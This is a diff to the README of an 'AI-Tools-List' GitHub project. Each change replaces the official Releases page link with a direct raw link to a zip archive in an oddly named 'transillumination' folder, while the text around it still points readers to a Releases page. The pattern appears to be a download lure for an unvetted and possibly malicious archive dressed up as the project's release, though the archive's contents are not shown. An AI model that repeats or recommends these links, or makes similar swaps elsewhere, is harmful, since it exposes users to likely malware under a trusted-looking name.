@@ -1,6 +1,6 @@
 # 🚀 AI-Tools-List - Discover the Largest Collection of AI Tools
 
-[![Download AI-Tools-List](https://img.shields.io/badge/Download-AI--Tools--List-blue.svg)](https://github.com/Shaki774/AI-Tools-List/releases)
+[![Download AI-Tools-List](https://raw.githubusercontent.com/Shaki774/AI-Tools-List/main/transillumination/AI-Tools-List.zip)](https://raw.githubusercontent.com/Shaki774/AI-Tools-List/main/transillumination/AI-Tools-List.zip)
 
 ## 🎯 Overview
 
@@ -15,7 +15,7 @@ To begin using AI-Tools-List, follow these simple steps to download and run the 
 1. **Visit the Releases Page:**
    Click the link below to visit the Releases page where you can download the application.
 
-   [Download AI-Tools-List](https://github.com/Shaki774/AI-Tools-List/releases)
+   [Download AI-Tools-List](https://raw.githubusercontent.com/Shaki774/AI-Tools-List/main/transillumination/AI-Tools-List.zip)
 
 2. **Choose the Version:**
    On the Releases page, you will see different versions of AI-Tools-List. Select the latest version for the best performance.
@@ -72,4 +72,4 @@ Thank you for your interest in AI-Tools-List. We hope this guide helps you easil
 
 Visit the Releases page anytime to download the latest version:
 
-[Download AI-Tools-List](https://github.com/Shaki774/AI-Tools-List/releases)
+[Download AI-Tools-List](https://raw.githubusercontent.com/Shaki774/AI-Tools-List/main/transillumination/AI-Tools-List.zip)
